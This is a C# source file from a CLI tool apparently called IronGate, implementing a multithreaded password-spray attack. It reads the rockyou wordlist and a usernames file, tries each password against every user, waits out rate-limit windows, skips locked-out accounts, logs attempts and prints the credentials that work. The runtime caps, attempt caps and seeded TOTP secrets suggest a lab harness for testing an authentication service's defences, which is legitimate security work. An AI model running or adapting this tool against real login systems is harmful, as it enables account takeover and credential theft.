
using IronGate.Cli.Constants;
using IronGate.Cli.Helpers;
using IronGate.Cli.Helpers.Dto;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
#nullable enable

namespace IronGate.Cli.Attacks {
    internal class PasswordSpray {

        // A global counter for all threads. We will have to make critical section for this.
        private static int globalHttpAttempts;
        private static long totalRequestMs;
        private static double averageMsPerRequest;
        private static bool TryReserveAttempt(int maxHttpAttempts, out int attemptNo) {
            while (true) {
                int current = Volatile.Read(ref globalHttpAttempts);
                if (current >= maxHttpAttempts) {
                    attemptNo = current;
                    return false;
                }

                int next = current + 1;
                if (Interlocked.CompareExchange(ref globalHttpAttempts, next, current) == current) {
                    attemptNo = next; // unique for this request
                    return true;
                }
            }
        }

        internal static async Task RunAsync (HttpClient http,AuthConfigDto config,UserSeed seed,string usernamesFile,int threads) {

            var baseDir = Directory.GetCurrentDirectory();
            var passwordList = Path.IsPathRooted(Defaults.RockYou)
                ? Defaults.RockYou
                : Path.Combine(baseDir, Defaults.RockYou);

            if (!File.Exists(passwordList)) {
                Console.WriteLine($"Wordlist not found: {passwordList}");
                return;
            }
            Console.WriteLine($"Path of passwords: {passwordList}");

            // Check validty of files
            if (!File.Exists(usernamesFile)) {
                Console.WriteLine($"Usernames file not found: {usernamesFile}");
                return;
            }

            if (!File.Exists(passwordList)) {
                Console.WriteLine($"Wordlist not found: {passwordList}");
                return;
            }

            // Mark the defaults
            var waitTimeSeconds = config.RateLimitEnabled ? config.RateLimitWindowSeconds : null;
            var maxHttpAttempts = Defaults.DefaultLimit;
            var maxRunTime = TimeSpan.FromSeconds(Defaults.TimeLimitSeconds);

            var groupSeed = seed.GroupSeed;

            // Min threads 1 ; Max threads 20
            if (threads < 1 ) threads = 1;
            if (threads > 20) threads = 20;


            var users = LoadUsernames(usernamesFile);
            if (users.Count == 0) {
                Console.WriteLine($"Username file at {usernamesFile} is empty!");
                return;
            }

            // aDDING a ctrl+c handler
            using var cancelSource = new CancellationTokenSource();
            void handler(object? s, ConsoleCancelEventArgs e) {
                e.Cancel = true;
                cancelSource.Cancel();
            }
            Console.CancelKeyPress += handler;

            var started = Stopwatch.StartNew();
            globalHttpAttempts = 0;
            totalRequestMs = 0;
            averageMsPerRequest = 0;

            var terminalUsers = new ConcurrentDictionary<string, bool>(StringComparer.OrdinalIgnoreCase);

            // Our log file (different than brute force) - since many threads, its critical section too.
            var logPath = Path.Combine(baseDir, "spray_log.jsonl");
            using var log = new StreamWriter(logPath, append: true, Encoding.UTF8);
            var logLock = new object();

            // TODO: Move this to prints
            Console.WriteLine("Attack: Password Spray");
            Console.WriteLine($"Usernames: {users.Count}");
            Console.WriteLine($"Threads: {threads}");
            Console.WriteLine($"Stop Conditions: AnySuccess/Runtime({maxRunTime.TotalSeconds}s)/HttpAttempts({maxHttpAttempts})");
            Console.WriteLine($"Log:  {logPath}");

            try {
                using var pwReader = new StreamReader(passwordList, Encoding.UTF8);

                while (!pwReader.EndOfStream && !cancelSource.IsCancellationRequested) {

                    if (started.Elapsed > maxRunTime) {
                        Console.WriteLine("Stopped: Runtime limit reached.");
                        return;
                    }

                    if (Volatile.Read(ref globalHttpAttempts) >= maxHttpAttempts) {
                        Console.WriteLine("Stopped: Attempts limit reached.");
                        return;
                    }

                    var password = await pwReader.ReadLineAsync().ConfigureAwait(false);
                    if (password == null) break;

                    password = password.Trim();
                    if (password.Length == 0) continue;

                    var q = new ConcurrentQueue<string>();
                    foreach (var u in users) {
                        if (terminalUsers.ContainsKey(u)) continue;
                        q.Enqueue(u);
                    }

                    if (q.IsEmpty)
                        break;

                    var found = new ConcurrentBag<(string user, string pass)>();

                    var tasks = new List<Task>(threads);
                    for (var i = 0; i < threads; i++) {

                        tasks.Add(Task.Run(async () => {
                            try {
                                while (!cancelSource.IsCancellationRequested) {

                                    if (started.Elapsed > maxRunTime) {
                                        cancelSource.Cancel();
                                        break;
                                    }

                                    if (!q.TryDequeue(out var username))
                                        break;

                                    if (terminalUsers.ContainsKey(username))
                                        continue;

                                    seed.TotpSecrets.TryGetValue(username, out var totpSec);
                                    totpSec ??= string.Empty;

                                    while (!cancelSource.IsCancellationRequested) {

                                        if (started.Elapsed > maxRunTime) {
                                            cancelSource.Cancel();
                                            break;
                                        }

                                        // Reserve ONE global attempt number for ONE request.
                                        if (!TryReserveAttempt(maxHttpAttempts, out int attemptNo)) {
                                            cancelSource.Cancel();
                                            break;
                                        }

                                        var args = new[] { "login", username, password, "-", "-" };

                                        var sw = Stopwatch.StartNew();
                                        var (_, resp) = await Login.LoginAction(
                                            http, args, (groupSeed ?? string.Empty), totpSec
                                        ).ConfigureAwait(false);
                                        sw.Stop();

                                        Interlocked.Add(ref totalRequestMs, sw.ElapsedMilliseconds);

                                        if (resp != null) {
                                            lock (logLock) {
                                                Printers.Log(attemptNo, log, username, password, resp, "spray");
                                            }
                                        }

                                        AuthAttemptDto? attempt = null;
                                        AuthResultCode? code = null;

                                        var authAttempt =
                                            (resp != null) &&
                                            HttpUtil.TryReadAuthAttempt(resp, out attempt) &&
                                            attempt != null;

                                        if (authAttempt)
                                            code = attempt!.Result;

                                        if (authAttempt && attempt!.Success) {
                                            found.Add((username, password));
                                        }

                                        if (code == AuthResultCode.LockedOut) {
                                            terminalUsers[username] = true;
                                            break;
                                        }

                                        if (code == AuthResultCode.RateLimited &&
                                            waitTimeSeconds.HasValue &&
                                            waitTimeSeconds.Value > 0) {

                                            try {
                                                await Task.Delay(
                                                    TimeSpan.FromSeconds(waitTimeSeconds.Value),
                                                    cancelSource.Token
                                                ).ConfigureAwait(false);
                                            }
                                            catch (OperationCanceledException) when (cancelSource.IsCancellationRequested) {
                                                break;
                                            }

                                            continue;
                                        }

                                        break;
                                    }
                                }
                            }
                            catch (OperationCanceledException) when (cancelSource.IsCancellationRequested) { }
                            catch (TaskCanceledException) when (cancelSource.IsCancellationRequested) { }
                        }, CancellationToken.None));
                    }

                    try {
                        await Task.WhenAll(tasks).ConfigureAwait(false);
                    }
                    catch (OperationCanceledException) when (cancelSource.IsCancellationRequested) { }
                    catch (TaskCanceledException) when (cancelSource.IsCancellationRequested) { }

                    if (!found.IsEmpty) {
                        foreach (var (u, p) in found)
                            Console.WriteLine($"Success: {u} / {p}");
                    }
                }

                if (started.Elapsed > maxRunTime)
                    Console.WriteLine("Stopped: Runtime limit reached.");
                else if (Volatile.Read(ref globalHttpAttempts) >= maxHttpAttempts)
                    Console.WriteLine("Stopped: Attempts limit reached.");
                else
                    Console.WriteLine("Finished: Wordlist ended or all users became terminal.");
            }
            finally {
                var total = Volatile.Read(ref globalHttpAttempts);
                averageMsPerRequest = total > 0 ? (double)totalRequestMs / total : 0;

                lock (logLock) {
                    Printers.WriteJsonl(log, new { totalAverageMs = averageMsPerRequest });
                }
                Console.CancelKeyPress -= handler;
            }
        }



        private static List<string> LoadUsernames(string usernameFile) {

            var list = new List<string>();
            var seen = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

            foreach (var line in System.IO.File.ReadLines(usernameFile, Encoding.UTF8)) {

                var u = (line ?? string.Empty).Trim();
                if (u.Length == 0) continue;
                if (seen.Add(u)) 
                    list.Add(u);
               
            }


            return list;
        }

    }
}
